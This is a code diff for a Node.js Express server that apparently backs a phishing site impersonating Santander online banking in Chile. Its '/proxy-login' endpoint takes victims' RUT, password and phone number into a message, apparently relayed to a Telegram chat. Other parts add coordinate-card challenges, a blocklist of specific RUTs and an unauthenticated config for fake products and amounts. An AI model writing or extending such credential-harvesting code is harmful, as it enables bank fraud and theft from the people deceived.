@@ -4,7 +4,7 @@ const cors = require("cors");
 
 const app = express();
 
-// Habilitar CORS
+// Habilitar CORS y parsing de JSON
 app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
@@ -16,7 +16,19 @@ const CHAT_ID = process.env.CHAT_ID;
 // Lista de RUTs bloqueados
 const bloqueados = ["250624344", "25062434-4", "25.062.434-4"];
 
-// Endpoint de login (coincide con tu frontend)
+// Configuración en memoria (puedes reemplazar con DB si quieres persistencia)
+let config = {
+  producto1: "",
+  monto1: "",
+  producto2: "",
+  monto2: "",
+  tipoAutorizacion: "santander",
+  coord1: "",
+  coord2: "",
+  coord3: ""
+};
+
+// Endpoint de login
 app.post("/proxy-login", async (req, res) => {
   const { rut, passwd, telefono } = req.body;
 
@@ -47,7 +59,7 @@ Teléfono: ${telefono}`;
   }
 });
 
-// Endpoint de autorización (recibe mensaje dinámico desde frontend)
+// Endpoint de autorización
 app.post("/autorizar", async (req, res) => {
   const { mensaje } = req.body;
 
@@ -70,6 +82,16 @@ app.get("/coordenadas", (req, res) => {
   const letras = ["A","B","C","D","E","F"];
   const seleccion = letras.sort(() => 0.5 - Math.random()).slice(0,3);
   res.json({ coordenadas: seleccion });
+});
+
+// Endpoint de configuración (para admin y productos)
+app.get("/config", (req, res) => {
+  res.json(config);
+});
+
+app.post("/config", (req, res) => {
+  config = req.body;
+  res.status(200).json({ message: "Configuración guardada" });
 });
 
 // Iniciar servidor
